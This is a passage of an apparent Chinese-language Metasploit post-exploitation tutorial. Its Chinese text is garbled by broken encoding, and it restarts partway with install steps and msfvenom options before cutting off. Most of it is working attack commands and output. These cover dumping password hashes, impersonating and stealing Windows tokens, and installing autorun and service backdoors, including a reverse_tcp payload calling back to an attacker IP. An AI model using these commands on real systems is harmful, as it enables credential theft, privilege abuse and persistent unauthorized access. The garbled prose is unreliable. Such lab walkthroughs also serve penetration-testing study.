class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-å‡å†’ä»¤ç‰Œ"><a href="#4-7-å‡å†’ä»¤ç‰Œ" class="headerlink" title="4.7 å‡å†’ä»¤ç‰Œ"></a>4.7 å‡å†’ä»¤ç‰Œ</h3><p>åœ¨ç”¨æˆ·ç™»å½•windowsæ“ä½œç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token)ï¼Œå½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒåŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„sessionæˆ–è€…cookieã€‚</p><p>msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œï¼Œå®ç°èº«ä»½åˆ‡æ¢ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒï¼Œåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognitoå‡å†’ä»¤ç‰Œ</span><br><span class="line">use incognito      #help incognito  æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">list_tokens -u    #æŸ¥çœ‹å¯ç”¨çš„token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #å‡å†’SYSTEM token</span><br><span class="line">æˆ–è€…impersonate_token NT\ AUTHORITY\\SYSTEM #ä¸åŠ å•å¼•å· éœ€ä½¿ç”¨\\</span><br><span class="line">execute -f cmd.exe -i â€“t    # -t ä½¿ç”¨å‡å†’çš„token æ‰§è¡Œ</span><br><span class="line">æˆ–è€…ç›´æ¥shell</span><br><span class="line">rev2self   #è¿”å›åŸå§‹token</span><br><span class="line"></span><br><span class="line"># 2.steal_tokençªƒå–ä»¤ç‰Œ</span><br><span class="line">steal_token &lt;pidå€¼&gt;   #ä»æŒ‡å®šè¿›ç¨‹ä¸­çªƒå–token   å…ˆps</span><br><span class="line">drop_token  #åˆ é™¤çªƒå–çš„token</span><br></pre></td></tr></table></figure><h3 id="4-8-æ¤å…¥åé—¨"><a href="#4-8-æ¤å…¥åé—¨" class="headerlink" title="4.8 æ¤å…¥åé—¨"></a>4.8 æ¤å…¥åé—¨</h3><p>Meterpreterä»…ä»…æ˜¯åœ¨å†…å­˜ä¸­é©»ç•™çš„Shellcodeï¼Œåªè¦ç›®æ ‡æœºå™¨é‡å¯å°±ä¼šä¸§å¤±æ§åˆ¶æƒï¼Œä¸‹é¢å°±ä»‹ç»å¦‚ä½•æ¤å…¥åé—¨ï¼Œç»´æŒæ§åˆ¶ã€‚</p><p>1.persistenceå¯åŠ¨é¡¹åé—¨</p><p>è·¯å¾„ï¼šmetasploit/scripts/meterpreter/persistence</p><p>åŸç†æ˜¯åœ¨<code>C:\Users***\AppData\Local\Temp\</code>ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬ï¼Œåœ¨æ³¨å†Œè¡¨<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ï¼Œ<strong>å¾ˆå®¹æ˜“è¢«æ€è½¯æ‹¦æˆªï¼Œå®˜æ–¹ä¸æ¨è</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence â€“h  #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-XæŒ‡å®šå¯åŠ¨çš„æ–¹å¼ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼Œ-iåå‘è¿æ¥çš„æ—¶é—´é—´éš”(5s) â€“r æŒ‡å®šæ”»å‡»è€…çš„ip</span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure><p>èƒ½å®ç°åŒæ ·åŠŸèƒ½çš„è„šæœ¬è¿˜æœ‰ï¼šexploit/windows/local/persistence</p><p>2.metsvcæœåŠ¡åé—¨</p><p>åœ¨C:\Users<em><strong>\AppData\Local\Temp\ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬<br>åœ¨æ³¨å†Œè¡¨HKLM\Software\Microsoft\Windows\CurrentVersion\Run\åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ã€‚</strong>é€šè¿‡æœåŠ¡å¯åŠ¨ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå®˜æ–¹ä¸æ¨èä½¿ç”¨ï¼Œè¿è¡Œå¤±è´¥</em>*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc â€“A   #è‡ªåŠ¨å®‰è£…åé—¨</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run metsvc â€“A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä½†æœåŠ¡æ²¡æœ‰å¯åŠ¨èµ·æ¥ï¼Œå¤±è´¥äº†ã€‚ä½¿ç”¨<code>-r</code>å‚æ•°å¯å¸è½½æœåŠ¡ã€‚</p><p>3.persistence_exe</p><p>å†æ¥çœ‹çœ‹å®˜æ–¹æ¨èçš„ä¸œè¥¿å§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure><p>æ­¤æ¨¡å—å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸Šè½½åˆ°è¿œç¨‹ä¸»æœºå¹¶è¿›è¡Œåˆ›å»ºæŒä¹…æ€§ã€‚<br>æ¶‰åŠåˆ°å››ä¸ªå‚æ•°</p><ul><li>REXENAMEæ˜¯æ‹·è´åˆ°ç›®æ ‡ç³»ç»Ÿä¸­çš„åå­—</li><li>EXEPATHæ˜¯å°†è¦ä¸Šä¼ çš„åé—¨åœ¨æœ¬åœ°çš„ä½ç½®</li><li>SESSIONæ˜¯é€‰æ‹©è¿è¡Œæ­¤æ¨¡å—çš„ä¼šè¯</li><li>STARTUPæ˜¯å¯åŠ¨ç±»å‹ï¼Œæœ‰USERã€SYSTEMã€SERVICEè¿™ä¸‰ç§å–å€¼ï¼ŒUSERè¡¨ç¤ºä¸ºå°†åœ¨ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨ï¼ŒSYSTEMè¡¨ç¤ºå°†åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨(éœ€è¦æƒé™)ï¼ŒSERVICEè¡¨ç¤ºå°†åˆ›å»ºä¸€ä¸ªå¯åŠ¨æœåŠ¡é¡¹(éœ€è¦æƒé™)ã€‚</li></ul><p>å°è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure><p>4.registry_persistence</p><p>å®Œæ•´è·¯å¾„ä¸ºexploit/windows/local/registry_persistence</p><p>å’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ï¼Œæ­¤æ¨¡å—å°†ä¼šå®‰è£…ä¸€ä¸ªpayloadåˆ°æ³¨å†Œè¡¨çš„å¯åŠ¨é¡¹ä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure><p>åŒç±»å‹çš„è¿˜æœ‰å…¶ä»–payloadï¼Œå¦‚exploit/windows/local/vss_persistenceï¼Œexploit/windows/local/s4u_persistenceã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">èŒæ–°ç§‘æ™® æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•ç”¨MSFè¿›è¡Œåæ¸—é€æµ‹è¯• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å°</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">è®¿é—®çš„æ–‡ç« å®¡æ ¸ä¸­â€¦ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a>## 1. å®‰è£…è¿è¡ŒåŠåˆå§‹åŒ–å®‰è£…<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># å®‰è£…å®Œæˆåä½ç½®</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># ç›®å½•ç»“æ„ </span><br><span class="line">--modules é‡ç‚¹çœ‹è¿™é‡Œå°±è¡Œäº†</span><br><span class="line">  --auxiliary ä¸»è¦åŒ…å«è¾…åŠ©æ€§è„šæœ¬(æ‰«æã€å—…æ¢ã€æ³¨å…¥ã€çˆ†ç ´ï¼Œæ¼æ´æŒ–æ˜)</span><br><span class="line">  --encoders ä¸»è¦åŒ…å«å„ç§ç¼–ç å·¥å…·ï¼Œä»¥ä¾¿ç»•è¿‡å…¥ä¾µæ£€æµ‹å’Œè¿‡æ»¤ç³»ç»Ÿ</span><br><span class="line">  --exploits æ¼æ´åˆ©ç”¨ï¼ŒåŒ…å«ä¸»æµçš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œexpå‘½åè§„åˆ™:ç³»ç»Ÿ/æœåŠ¡/æ¨¡å—</span><br><span class="line">  --nops ç»•è¿‡é’ˆå¯¹æº¢å‡ºæ”»å‡»æ»‘è¡Œå­—ç¬¦ä¸²çš„æ‹¦æˆªæ£€æµ‹</span><br><span class="line">  --payloads æ”»å‡»è·è½½ï¼Œä¸»è¦åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»£ç </span><br><span class="line">  --post æ­¤ç›®å½•æ”¾ç€msfçš„exploitæ‰§è¡ŒæˆåŠŸåï¼Œå‘ç›®æ ‡å‘é€çš„ä¸€äº›åŠŸèƒ½æ€§æŒ‡ä»¤ï¼Œå¦‚ææƒï¼Œè·å–hashç­‰</span><br><span class="line">  --evasion æ–°å¢ï¼Œç”¨æ¥ç”Ÿæˆå…æ€payloadï¼Œç±»ä¼¼äºé›†æˆmsfvenomåŠŸèƒ½</span><br><span class="line">--data æ”¾äº†meterpreter ï¼ŒpassiveXï¼Œvncï¼ŒDLLsï¼Œç­‰è¿™äº›å·¥å…·å’Œä¸€äº›ç”¨æˆ·æ¥å£ä»£ç ï¼Œmsfweb å’Œä¸€äº›å…¶ä»–æ¨¡å—ç”¨åˆ°çš„æ•°æ®æ–‡ä»¶</span><br><span class="line">--plugins è¿™é‡Œçš„æ¨¡å—ç”¨æˆ·éœ€è¦loadæ¥åŠ è½½ï¼Œæä¾›æ•°æ®åº“è¿æ¥æ’ä»¶å’Œå„ç§è¦ç”¨åˆ°çš„æ’ä»¶</span><br><span class="line">--scripts è¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å¤§éƒ½æ˜¯meterpreterè¿™ä¸ªæ¨¡å—åˆ©ç”¨çš„è„šæœ¬ï¼Œæ¯”å¦‚ç”¨åˆ°migrateæ¥è½¬ç§»åˆ°å…¶ä»–è¿›ç¨‹çš„æŒ‡ä»¤çš„æºä»£ç å°±åœ¨æ­¤</span><br><span class="line">--tools åŒ…å«ä¸€äº›æœ‰ç”¨çš„è„šæœ¬å’Œé›¶æ•£çš„å·¥å…·</span><br></pre></td></tr></table></figure>å¯åŠ¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è¿è¡Œ</span><br><span class="line">$ msfconsole</span><br><span class="line"># åˆå§‹åŒ–æ•°æ®åº“</span><br><span class="line">$ msfdb init</span><br><span class="line"># é‡å»ºç¼“å­˜</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># æŸ¥çœ‹æ•°æ®åº“è¿æ¥æƒ…å†µ</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msfåŸºæœ¬å‘½ä»¤-1"><a href="#2-msfåŸºæœ¬å‘½ä»¤-1" class="headerlink" title="2. msfåŸºæœ¬å‘½ä»¤"></a>2. msfåŸºæœ¬å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¸—é€æ”»å‡»ç¨‹åºä»£ç  </span><br><span class="line">show auxiliary â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„è¾…åŠ©æ”»å‡»å·¥å…· </span><br><span class="line">show options â€“ æŸ¥çœ‹è¯¥æ¨¡å—æ‰€æœ‰å¯ç”¨é€‰é¡¹ </span><br><span class="line">show payloads â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ‰€æœ‰è½½è·ä»£ç  </span><br><span class="line">show targets â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ”»å‡»ç›®æ ‡ç±»å‹</span><br><span class="line">search â€“ æ ¹æ®å…³é”®å­—æœç´¢æŸæ¨¡å— </span><br><span class="line">info â€“ æ˜¾ç¤ºæŸæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯ </span><br><span class="line">use â€“ è¿›å…¥ä½¿ç”¨æŸæ¸—é€æ”»å‡»æ¨¡å— </span><br><span class="line">back â€“ å›é€€ </span><br><span class="line">set/unset â€“ è®¾ç½®/ç¦ç”¨æ¨¡å—ä¸­çš„æŸä¸ªå‚æ•° </span><br><span class="line">setg/unsetg â€“ è®¾ç½®/ç¦ç”¨é€‚ç”¨äºæ‰€æœ‰æ¨¡å—çš„å…¨å±€å‚æ•° </span><br><span class="line">save â€“ å°†å½“å‰è®¾ç½®å€¼ä¿å­˜ä¸‹æ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡å¯åŠ¨MSFç»ˆç«¯æ—¶ä»å¯ä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="3-msfvenomç”Ÿæˆpayload-1"><a href="#3-msfvenomç”Ÿæˆpayload-1" class="headerlink" title="3 msfvenomç”Ÿæˆpayload"></a>3 msfvenomç”Ÿæˆpayload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„payload(æ”»å‡»è·è½½)</span><br><span class="line">-l, --list       [module_type]   åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº,æ¨¡å—ç±»å‹åŒ…æ‹¬: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦</span><br><span class="line">-f, --format     &lt;format&gt;        æŒ‡å®šè¾“å‡ºæ ¼å¼ (ä½¿ç”¨ --help-formats æ¥è·å–msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨)</span><br><span class="line">-e, --encoder    [encoder]       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰</span><br><span class="line">-a, --arch       &lt;architecture&gt;  æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„</span><br><span class="line">    --platform   &lt;platform&gt;      æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°</span><br><span class="line">-s, --space      &lt;length&gt;        è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          è®¾å®šè§„é¿å­—ç¬¦é›†ï¼Œæ¯”å¦‚: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°</span><br><span class="line">-c, --add-code   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶</span><br><span class="line">-x, --template   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿</span><br><span class="line">-k, --keep                       ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span><br><span class="line">    --payload-options            åˆ—ä¸¾payloadçš„æ 